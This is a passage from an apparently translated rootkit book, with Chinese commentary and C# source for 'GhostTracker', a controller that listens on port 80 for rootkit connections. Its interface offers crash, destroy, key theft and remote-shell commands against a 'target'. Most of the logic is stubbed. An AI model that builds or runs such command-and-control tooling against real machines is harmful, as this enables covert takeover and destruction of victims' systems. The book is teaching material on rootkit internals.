this.checkConnectionLabel.Name = "checkConnectionLabel";
this.checkConnectionLabel.Size = new System.Drawing.Size(136, 16);
this.checkConnectionLabel.TabIndex = 3;
this.checkConnectionLabel.Text = "Check connection";
//
// putFileLabel
//
this.putFileLabel.Location = new System.Drawing.Point(16, 72);
this.putFileLabel.Name = "putFileLabel";
this.putFileLabel.Size = new System.Drawing.Size(136, 16);
this.putFileLabel.TabIndex = 4;
this.putFileLabel.Text = "Put file...";
//
// getFileLabel
//
this.getFileLabel.Location = new System.Drawing.Point(16, 96);
this.getFileLabel.Name = "getFileLabel";
this.getFileLabel.Size = new System.Drawing.Size(136, 16);
this.getFileLabel.TabIndex = 5;
this.getFileLabel.Text = "Get file...";
//
// putKeyLabel
//
this.putKeyLabel.Location = new System.Drawing.Point(16, 120);
this.putKeyLabel.Name = "putKeyLabel";
this.putKeyLabel.Size = new System.Drawing.Size(136, 16);
this.putKeyLabel.TabIndex = 6;
this.putKeyLabel.Text = "Put key...";
//
// getKeyLabel
//
this.getKeyLabel.Location = new System.Drawing.Point(16, 144);
this.getKeyLabel.Name = "getKeyLabel";
this.getKeyLabel.Size = new System.Drawing.Size(136, 16);
this.getKeyLabel.TabIndex = 7;
this.getKeyLabel.Text = "Get key...";
//
// CrashTargetLabel
//
this.CrashTargetLabel.Location = new System.Drawing.Point(16, 168);
this.CrashTargetLabel.Name = "CrashTargetLabel";
this.CrashTargetLabel.Size = new System.Drawing.Size(136, 16);
this.CrashTargetLabel.TabIndex = 8;
this.CrashTargetLabel.Text = "Crash target.";
//
// cleanTargetLabel
//
this.cleanTargetLabel.Location = new System.Drawing.Point(16, 192);
this.cleanTargetLabel.Name = "cleanTargetLabel";
this.cleanTargetLabel.Size = new System.Drawing.Size(136, 16);
this.cleanTargetLabel.TabIndex = 9;
this.cleanTargetLabel.Text = "Clean target.";
//
// destroyTargetLabel
//
this.destroyTargetLabel.Location = new System.Drawing.Point(16, 216);
this.destroyTargetLabel.Name = "destroyTargetLabel";
this.destroyTargetLabel.Size = new System.Drawing.Size(136, 16);
this.destroyTargetLabel.TabIndex = 10;
this.destroyTargetLabel.Text = "Destroy target.";
//
// checkConnectionButton
//
this.checkConnectionButton.Location = new System.Drawing.Point(152, 40);
this.checkConnectionButton.Name = "checkConnectionButton";
this.checkConnectionButton.Size = new System.Drawing.Size(56, 23);
this.checkConnectionButton.TabIndex = 11;
this.checkConnectionButton.Text = "check";
this.checkConnectionButton.Click += new
System.EventHandler(this.checkConnectionButton_Click);
//
// putFileButton
//
this.putFileButton.Location = new System.Drawing.Point(152, 64);
this.putFileButton.Name = "putFileButton";
this.putFileButton.Size = new System.Drawing.Size(56, 23);
this.putFileButton.TabIndex = 12;
this.putFileButton.Text = "put file";
//
// getFileButton
//
this.getFileButton.Location = new System.Drawing.Point(152, 88);
this.getFileButton.Name = "getFileButton";
this.getFileButton.Size = new System.Drawing.Size(56, 23);
this.getFileButton.TabIndex = 13;
this.getFileButton.Text = "get file";
//
// putKeyButton
//
this.putKeyButton.Location = new System.Drawing.Point(152, 112);
this.putKeyButton.Name = "putKeyButton";
this.putKeyButton.Size = new System.Drawing.Size(56, 23);
this.putKeyButton.TabIndex = 14;
this.putKeyButton.Text = "put key";
//
// getKeyButton
//
this.getKeyButton.Location = new System.Drawing.Point(152, 136);
this.getKeyButton.Name = "getKeyButton";
this.getKeyButton.Size = new System.Drawing.Size(56, 23);
this.getKeyButton.TabIndex = 15;
this.getKeyButton.Text = "get key";
//
// crashTargetButton
//
this.crashTargetButton.Location = new System.Drawing.Point(152, 160);
this.crashTargetButton.Name = "crashTargetButton";
this.crashTargetButton.Size = new System.Drawing.Size(56, 23);
this.crashTargetButton.TabIndex = 16;
this.crashTargetButton.Text = "crash";
//
// cleanTargetButton
//
this.cleanTargetButton.Location = new System.Drawing.Point(152, 184);
this.cleanTargetButton.Name = "cleanTargetButton";
this.cleanTargetButton.Size = new System.Drawing.Size(56, 23);
this.cleanTargetButton.TabIndex = 17;
this.cleanTargetButton.Text = "clean";
//
// destroyTargetButton
//
this.destroyTargetButton.Location = new System.Drawing.Point(152, 208);
this.destroyTargetButton.Name = "destroyTargetButton";
this.destroyTargetButton.Size = new System.Drawing.Size(56, 23);
this.destroyTargetButton.TabIndex = 18;
this.destroyTargetButton.Text = "destroy";
//
// commandShellButton
//
this.commandShellButton.Location = new System.Drawing.Point(152, 232);
this.commandShellButton.Name = "commandShellButton";
this.commandShellButton.Size = new System.Drawing.Size(56, 23);
this.commandShellButton.TabIndex = 20;
this.commandShellButton.Text = "shell";
//
// commandShellLabel
//
this.commandShellLabel.Location = new System.Drawing.Point(16, 240);
this.commandShellLabel.Name = "commandShellLabel";
this.commandShellLabel.Size = new System.Drawing.Size(136, 16);
this.commandShellLabel.TabIndex = 19;
this.commandShellLabel.Text = "Open a command shell.";
//
// ControlForm
//
this.AutoScaleBaseSize = new System.Drawing.Size(5, 13);
this.ClientSize = new System.Drawing.Size(216, 317);
this.Controls.Add(this.commandShellButton);
this.Controls.Add(this.commandShellLabel);
this.Controls.Add(this.destroyTargetButton);
this.Controls.Add(this.cleanTargetButton);
this.Controls.Add(this.crashTargetButton);
this.Controls.Add(this.getKeyButton);
this.Controls.Add(this.putKeyButton);
this.Controls.Add(this.getFileButton);
this.Controls.Add(this.putFileButton);
this.Controls.Add(this.checkConnectionButton);
this.Controls.Add(this.destroyTargetLabel);
this.Controls.Add(this.cleanTargetLabel);
this.Controls.Add(this.CrashTargetLabel);
this.Controls.Add(this.getKeyLabel);
this.Controls.Add(this.putKeyLabel);
this.Controls.Add(this.getFileLabel);
this.Controls.Add(this.putFileLabel);
this.Controls.Add(this.checkConnectionLabel);
this.Controls.Add(this.statusTextBox);
this.Controls.Add(this.statusLabel);
this.Controls.Add(this.IPLabel);
this.Name = "ControlForm";
this.Text = "Target Controller";
this.ResumeLayout(false);
}
#endregion
private void checkConnectionButton_Click(object sender, System.EventArgs e)
{
// Check to see if the target is still there
if( myTarget.Ping() )
statusTextBox.Text = "Target is responding.";
else
statusTextBox.Text = "Target is not responding.";
}
}
}
TargetController.cs
TargetController.cs
TargetController.cs
TargetController.cs
文件 TargetController.cs 包含一个 TargetController 类，它包含下面的成员函数：
TargetController(构造函数) － 为每个连接初始化一个实例
Start － 处理一个进入的连接
Ping － 一个子函数。在一个实际的控制器里它会验证连接是否正常
Stop － 关闭连接
对于每个新的 rootkti 连接都会创建一个 TargetController 类的实例。这个类是负责处理初始
化连接的。在实际的控制器里它还包含有链接控制逻辑。
// TargetController.cs
// Copyright Ric Vieler, 2006
// This file supports rootkit communications
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Globalization;
namespace GhostTracker
{
/// 
/// Summary description for TargetController.
/// 
public class TargetController
{
string targetAddress = "";
MainForm mainFormPtr;
TcpClient myClient;
public TargetController( MainForm parent, TcpClient client )
{
mainFormPtr = parent;
myClient = client;
}
/// 
/// Handle a single Ghost connections
/// 
public void Start()
{
try
{
Int32 bytesRead;
// Buffer for reading data
Byte[] bytes = new Byte[1024];
String data = "";
// Get a stream object for reading and writing
NetworkStream stream = myClient.GetStream();
// receive the data sent by the client.
while( true )
{
if( !stream.DataAvailable )
{
Thread.Sleep(20);
continue;
}
bytesRead = stream.Read( bytes, 0, bytes.Length );
// Translate data bytes to a ASCII string.
data = System.Text.Encoding.ASCII.GetString( bytes, 0, bytesRead );
// Process the data sent by the client.
if( targetAddress.Length == 0 )
{
// Initial data is always the target's IP address
// Send to GhostTracker with target information
DateTime time = DateTime.Now;
targetAddress = data;
mainFormPtr.AddTarget( this, targetAddress,
" Connected " + time.ToString( "G" ) );
continue;
}
// Process reviewed data
Thread.Sleep( 20 );
}
}
catch( ThreadAbortException )
{
// Application is shutting down
}
}
public bool Ping()
{
return( true );
}
/// 
/// Clean up any resources being used.
/// 
public void Stop()
{
// Shutdown the connection
myClient.Close();
}
}
}
Listen.cs
Listen.cs
Listen.cs
Listen.cs
文件 Listrn.cs 包含一个 Listen 类，它包含下面的成员函数：
Listen（构造函数）－ 初始化一个且是惟一的一个实例
Start － 开始 TCP/IP 监视
Stop － 停止 TCP/IP 监视
Listen 类简单的监听 TCP/IP 的连接并且为每个新的连接生成一个 TargetController 线
程。这个类虽然简单但却是完整的，因为远程控制器不需要监听线程有其它的功能。
// Listen.cs
// Copyright Ric Vieler, 2006
// Spawns a TargetController for each new connection
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
namespace GhostTracker
{
/// 
/// Summary description for Listen.
/// 
public class Listen
{
MainForm mainFormPtr;
TargetController myTarget = null;
Thread myThread = null;
TcpListener myServer = null;
bool listening = false;
public Listen( MainForm parent )
{
mainFormPtr = parent;
}
/// 
/// Listen for Ghost connections
/// 
public void Start()
{
try
{
// Set the TcpListener on port 80.
Int32 port = 80;
// Use "0" to let the IP Stack figure out the IP Address
IPAddress localAddr = IPAddress.Parse( "0" );
myServer = new TcpListener( localAddr, port );
// Start listening for client requests.
myServer.Start();
listening = true;
// Enter the listening loop.
while ( listening )
{
// See if a connection request is pending
if ( !myServer.Pending() )
{
// Wait 50 milliseconds and then try again
Thread.Sleep( 50 );
if ( !listening )
break;
continue;
}
// Perform a blocking call to accept requests.
TcpClient client = myServer.AcceptTcpClient();
// Spawn a new TargetController for each new connection
myTarget = new TargetController( mainFormPtr, client );
myThread = new Thread( new ThreadStart( myTarget.Start ) );
// Start the TARGET thread.
myThread.Start();